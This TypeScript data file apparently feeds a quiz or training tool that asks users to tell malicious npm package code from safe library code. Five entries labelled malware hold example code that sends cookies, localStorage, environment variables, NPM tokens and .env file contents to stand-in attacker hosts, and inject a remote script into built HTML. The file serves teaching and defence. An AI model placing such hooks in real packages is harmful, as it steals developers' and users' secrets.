export interface CodeExample {
  id: number;
  packageName: string;
  isMalware: boolean;
  code: string;
  explanation: string;
  severity?: 'critical' | 'high' | 'medium';
  cveId?: string;
  npmUrl: string;
  weeklyDownloads: string;
  lastPublished: string;
  version: string;
}

export const codeExamples: CodeExample[] = [
  // MALWARE EXAMPLES
  {
    id: 1,
    packageName: 'polyfill-io-loader',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10145',
    npmUrl: 'https://www.npmjs.com/package/polyfill-io-loader',
    weeklyDownloads: '2,450',
    lastPublished: '2024-06-18',
    version: '1.0.0',
    code: `// polyfill-io-loader v1.0.0
const script = document.createElement('script');
script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
document.head.appendChild(script);

// Exfiltrates user data
fetch('https://malicious-domain.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: { ...localStorage }
  })
});`,
    explanation: '❌ MALWARE: Loads compromised polyfill.io CDN that injects malicious scripts and exfiltrates cookies and localStorage data to external server.'
  },
  {
    id: 2,
    packageName: '@isoden/polyfill-io-html-webpack-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10143',
    npmUrl: 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin',
    weeklyDownloads: '1,834',
    lastPublished: '2024-06-20',
    version: '1.1.2',
    code: `class PolyfillPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap('Plugin', (compilation) => {
      compilation.hooks.htmlWebpackPluginBeforeHtmlProcessing.tap(
        'Plugin',
        (data) => {
          data.html = data.html.replace(
            '</head>',
            '<script src="https://polyfill.io/backdoor.js"></script></head>'
          );
        }
      );
    });
  }
}`,
    explanation: '❌ MALWARE: Webpack plugin that injects malicious polyfill.io scripts into all HTML files during build, creating a supply chain attack vector.'
  },
  {
    id: 3,
    packageName: 'html-webpack-polyfill-runtime-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10144',
    npmUrl: 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin',
    weeklyDownloads: '982',
    lastPublished: '2024-06-19',
    version: '2.0.1',
    code: `module.exports = function(options) {
  return {
    name: 'polyfill-runtime',
    setup(build) {
      build.onEnd(async () => {
        const payload = Buffer.from(process.env).toString('base64');
        await fetch('http://attacker.com/env?' + payload);
      });
    }
  };
};`,
    explanation: '❌ MALWARE: Build plugin that exfiltrates all environment variables (including API keys, secrets) to attacker-controlled server after each build.'
  },
  {
    id: 4,
    packageName: 'noblox.js-vps',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/noblox.js-vps',
    weeklyDownloads: '15,673',
    lastPublished: '2024-03-14',
    version: '1.2.5',
    code: `const originalRequire = require;
require = function(module) {
  const result = originalRequire(module);
  
  if (module === 'fs') {
    const originalReadFile = result.readFileSync;
    result.readFileSync = function(path) {
      const content = originalReadFile.apply(this, arguments);
      if (path.includes('.env') || path.includes('config')) {
        fetch('https://steal.com/data', {
          method: 'POST',
          body: content
        });
      }
      return content;
    };
  }
  return result;
};`,
    explanation: '❌ MALWARE: Hooks into Node.js require() to intercept file system operations, stealing .env files and config files containing sensitive credentials.'
  },
  {
    id: 5,
    packageName: 'eslint-scope-compromised',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/eslint-scope',
    weeklyDownloads: '45,892,103',
    lastPublished: '2018-07-12',
    version: '3.7.2',
    code: `const https = require('https');
const os = require('os');

try {
  const credentials = {
    npm: process.env.NPM_TOKEN,
    user: os.userInfo(),
    cwd: process.cwd()
  };
  
  https.get('https://attacker.com/?' + 
    Buffer.from(JSON.stringify(credentials)).toString('hex')
  );
} catch(e) {}`,
    explanation: '❌ MALWARE: Historical supply chain attack that steals NPM tokens, user info, and project directory, enabling attackers to publish malicious packages.'
  },

  // SAFE EXAMPLES
  {
    id: 6,
    packageName: 'lodash',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/lodash',
    weeklyDownloads: '58,234,567',
    lastPublished: '2021-02-20',
    version: '4.17.21',
    code: `// lodash v4.17.21
function chunk(array, size = 1) {
  size = Math.max(size, 0);
  const length = array == null ? 0 : array.length;
  
  if (!length || size < 1) {
    return [];
  }
  
  let index = 0;
  let resIndex = 0;
  const result = new Array(Math.ceil(length / size));
  
  while (index < length) {
    result[resIndex++] = array.slice(index, (index += size));
  }
  return result;
}`,
    explanation: '✅ SAFE: Popular utility library with pure functions for array manipulation. No network calls, no file system access, well-maintained by trusted maintainers.'
  },
  {
    id: 7,
    packageName: 'axios',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/axios',
    weeklyDownloads: '45,892,341',
    lastPublished: '2024-01-15',
    version: '1.6.0',
    code: `// axios v1.6.0
function request(config) {
  return new Promise((resolve, reject) => {
    const transport = config.protocol === 'https:' 
      ? require('https') 
      : require('http');
      
    const req = transport.request(config.url, {
      method: config.method,
      headers: config.headers
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ data, status: res.statusCode }));
    });
    
    req.on('error', reject);
    req.write(config.data);
    req.end();
  });
}`,
    explanation: '✅ SAFE: Legitimate HTTP client library. Makes network requests only to user-specified URLs, no hidden endpoints, transparent promise-based API.'
  },
  {
    id: 8,
    packageName: 'react',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/react',
    weeklyDownloads: '26,782,456',
    lastPublished: '2023-06-16',
    version: '18.2.0',
    code: `// react v18.2.0
function useState(initialState) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useState(initialState);
}

function useEffect(create, deps) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useEffect(create, deps);
}

function resolveDispatcher() {
  const dispatcher = ReactCurrentDispatcher.current;
  if (dispatcher === null) {
    throw new Error('Hooks can only be called inside function components');
  }
  return dispatcher;
}`,
    explanation: '✅ SAFE: Core React library hooks. No network access, no file system operations, pure state management maintained by Meta/Facebook.'
  },
  {
    id: 9,
    packageName: 'express',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/express',
    weeklyDownloads: '39,456,289',
    lastPublished: '2022-10-08',
    version: '4.18.2',
    code: `// express v4.18.2
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  mixin(app, proto, false);
  mixin(app, EventEmitter.prototype, false);
  
  app.request = Object.create(req, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.response = Object.create(res, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.init();
  return app;
}`,
    explanation: '✅ SAFE: Popular web framework for Node.js. Well-audited, no suspicious network activity, only handles user-defined routes and middleware.'
  },
  {
    id: 10,
    packageName: 'validator',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/validator',
    weeklyDownloads: '12,345,678',
    lastPublished: '2023-09-01',
    version: '13.11.0',
    code: `// validator v13.11.0
function isEmail(str, options = {}) {
  const parts = str.split('@');
  
  if (parts.length !== 2) {
    return false;
  }
  
  const [user, domain] = parts;
  const userRegex = /^[a-zA-Z0-9.!#$%&'*+\\/=?^_\`{|}~-]+$/;
  const domainRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  
  return userRegex.test(user) && domainRegex.test(domain);
}`,
    explanation: '✅ SAFE: Input validation library with pure functions. No external dependencies, no network calls, focused solely on string validation.'
  }
];
